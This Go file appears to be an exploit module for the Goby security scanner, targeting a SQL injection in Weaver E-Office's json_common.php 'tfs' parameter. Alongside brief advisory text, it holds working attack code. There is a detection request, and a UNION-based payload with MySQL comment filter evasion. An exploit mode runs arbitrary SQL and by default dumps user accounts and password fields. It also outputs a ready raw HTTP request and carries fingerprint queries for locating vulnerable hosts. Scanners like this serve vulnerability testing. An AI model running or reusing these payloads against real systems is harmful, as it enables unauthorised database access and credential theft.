package exploits

import (
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver E-Office json_common.php tfs SQL injection vulnerability",
    "Description": "<p>Weaver E-Office is an OA product launched by Weaver for small and medium-sized organizations.</p><p>There is a SQL injection vulnerability in Weaver E-office when sending tfs parameters to /building/json_common.php POST.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2023-03-09",
    "Author": "715827922@qq.com",
    "FofaQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\" || header=\"LOGIN_LANG\" || banner=\"LOGIN_LANG\"",
    "GobyQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\" || header=\"LOGIN_LANG\" || banner=\"LOGIN_LANG\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has provided detailed solutions. Please pay attention to the manufacturer's homepage for updates: <a href=\"https://service.e-office.cn/download\">https://service.e-office.cn/download</a></p><p>Temporary fix:</p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "/*!50000select*/ group_concat(user_id,user_accounts,user_name,password) from user",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/building/json_common.php",
                "follow_redirect": true,
                "header": {
                    "Content-Length": "67",
                    "Accept-Language": "zh-CN,zh;q=0.8",
                    "Accept": "*/*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
                    "Connection": "keep-alive",
                    "Referer": "http://www.baidu.com",
                    "Cache-Control": "max-age=0",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "tfs=city%60+where+cityId+%3d-1+/*!50000union*/+/*!50000select*/+1,2,MD5(23432)+,4%23|2|333"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "1cdbc566ab18141dbf2586d9707cdfdc",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/building/json_common.php",
                "follow_redirect": true,
                "header": {
                    "Content-Length": "67",
                    "Accept-Language": "zh-CN,zh;q=0.8",
                    "Accept": "*/*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
                    "Connection": "keep-alive",
                    "Referer": "http://www.baidu.com",
                    "Cache-Control": "max-age=0",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "tfs=city%60+where+cityId+%3d-1+/*!50000union*/+/*!50000select*/+1,2,{{{sql}}}+,4%23|2|333"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "\\[[\\w\\W]+\\]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\\[([\\w\\W]+)\\]"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office json_common.php tfs SQL 注入漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微 E-Office 是泛微公司面向中小型组织推出的 OA 产品。</p><p>泛微 E-Office 在向 /building/json_common.php POST 发送 tfs 参数时存在 SQL 注入漏洞。</p>",
            "Recommendation": "<p>目前厂商已<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">提供</span>详细的解决方案，请关注厂商主页更新：<a href=\"https://service.e-office.cn/download\">https://service.e-office.cn/download</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>除了利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Weaver E-Office json_common.php tfs SQL injection vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>Weaver E-Office is an OA product launched by Weaver for small and medium-sized organizations.</p><p>There is a SQL injection vulnerability in Weaver E-office when sending tfs parameters to /building/json_common.php POST.</p>",
            "Recommendation": "<p>At present, the manufacturer has provided detailed solutions. Please pay attention to the manufacturer's homepage for updates: <a href=\"https://service.e-office.cn/download\" target=\"_blank\">https://service.e-office.cn/download</a></p><p>Temporary fix:</p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-19",
    "PocId": "10881"
}`

	sendPaylaod9b4c0a1c := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/building/json_common.php")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = "tfs=" + url.QueryEscape("city` where cityId =-1 /*!50000union*/ /*!50000all*/ /*!50000select*/ 1,2,("+sql+"),4#|2")
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			sql := "/*!50000select*/ 0x" + hex.EncodeToString([]byte(checkStr))
			rsp, _ := sendPaylaod9b4c0a1c(u, sql)
			return rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, sql)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			sql := goutils.B2S(ss.Params["sql"])
			if attackType == "sql" {
				rsp, err := sendPaylaod9b4c0a1c(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if strings.Contains(rsp.Utf8Html, "[\"") && strings.Contains(rsp.Utf8Html, "\"]") {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html[strings.Index(rsp.Utf8Html, "[\"")+2 : strings.Index(rsp.Utf8Html, "\"]")]
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败，请检查语法或关键字过滤"
				}
			} else if attackType == "sqlPoint" {
				checkStr := goutils.RandomHexString(8)
				rsp, _ := sendPaylaod9b4c0a1c(expResult.HostInfo, "/*!50000select*/ 0x"+hex.EncodeToString([]byte(checkStr)))
				if rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, sql) {
					expResult.Success = true
					expResult.Output = `
POST /building/json_common.php HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Content-Length: 202
Accept: */*
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Accept-Language: zh-CN,zh;q=0.8
Cache-Control: max-age=0
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

tfs=city%60%20where%20cityId%20%3d-1%20%2f*!50000union*%2f%20%2f*!50000select*%2f%201%2c2%2c(%2f*!50000select*%2f%20group_concat(user_id%2cuser_accounts%2cuser_name%2cpassword)%20from%20user)%2c4%23%7c2`
				} else {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Success = false
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
